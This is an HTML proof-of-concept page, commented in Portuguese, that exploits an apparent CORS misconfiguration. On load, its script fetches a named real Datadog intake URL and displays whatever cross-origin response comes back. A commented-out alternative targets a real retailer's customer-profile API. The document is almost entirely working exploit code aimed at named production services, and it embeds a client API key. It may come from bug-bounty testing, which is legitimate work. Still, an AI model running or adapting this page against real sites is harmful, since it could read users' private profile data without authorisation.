<!DOCTYPE html>
<html>
<head>
    <title>POC de Exploração de CORS Incorreto</title>
</head>
<body>
    <h1>Prova de Conceito (POC) - Leitura de Resposta Cross-Origin</h1>
    
    <p>O script abaixo tenta fazer uma requisição para o endpoint alvo e exibir a resposta.</p>
    
    <script>
        // URL VULNERÁVEL (Use o endpoint que retorna dados que você quer ler)
        // Usaremos a URL mencionada como exemplo de requisição:
        const VULNERABLE_URL = 'https://browser-intake-datadoghq.com/api/v2/rum?ddsource=browser&dd-api-key=pub75ad0c3b08ce2dd249e3dba1791bca84&dd-evp-origin-version=6.22.0&dd-evp-origin=browser&dd-request-id=5ad94e5a-ec5c-4525-b732-7af8232bacd3&batch_time=1761064984867&_dd.api=fetch-keepalive'; 

        // Endpoint de exemplo que pode retornar dados legíveis (se o primeiro não retornar dados úteis)
        // const VULNERABLE_URL = 'https://shop.lululemon.com/api/dataenablement/profile'; 

        document.addEventListener('DOMContentLoaded', () => {
            fetch(VULNERABLE_URL)
                .then(response => {
                    // Verifica se a requisição foi bem-sucedida
                    if (response.ok) {
                        return response.text(); // Lê a resposta como texto
                    } else {
                        throw new Error('Falha na requisição: ' + response.statusText);
                    }
                })
                .then(data => {
                    // Esta parte é a **PROVA DA VULNERABILIDADE**
                    // Se a resposta for lida e exibida, o CORS está incorreto.
                    document.getElementById('status').innerText = 'SUCESSO: Resposta Cross-Origin Lida!';
                    document.getElementById('response-data').innerText = data;
                    console.log('Dados Lidos:', data);
                })
                .catch(error => {
                    document.getElementById('status').innerText = 'FALHA: ' + error.message;
                    document.getElementById('response-data').innerText = 'Verifique o console para detalhes. Se a falha for CORS, o erro não aparecerá aqui, mas sim no Console do navegador (o que prova a proteção). Se o erro for outro (ex: 404), a POC foi enviada com sucesso mas o endpoint não retornou dados.';
                    console.error('Erro de POC:', error);
                });
        });
    </script>
    
    <h2>Status da Exploração:</h2>
    <p id="status">Tentando buscar dados...</p>
    
    <h2>Dados da Resposta Lidos:</h2>
    <pre id="response-data" style="border: 1px solid #ccc; padding: 10px; white-space: pre-wrap; background-color: #f9f9f9;">Aguardando resposta...</pre>
    
</body>
</html>
